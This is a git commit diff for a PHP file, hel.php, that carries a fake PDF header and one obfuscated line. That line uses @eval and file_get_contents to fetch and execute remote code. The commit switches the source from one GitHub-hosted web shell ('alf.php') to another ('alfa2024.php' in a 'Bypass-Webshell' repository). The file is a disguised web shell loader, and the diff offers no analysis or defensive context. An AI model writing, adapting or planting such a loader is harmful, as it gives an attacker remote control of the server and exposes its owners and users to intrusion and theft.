60203edca0b529ed06c9a205f47c8234986dcc22
luxeus_arch <74091721+ardifx01@users.noreply.github.com>
2025-01-07 18:36:32 +0700

    Update hel.php

--- hel.php
+++ hel.php
@@ -1,2 +1,2 @@
 %PDF-1.7
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/ardifx01/Shell/main/alf.php"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/sagsooz/Bypass-Webshell/raw/main/alfa2024.php"));/**/?>
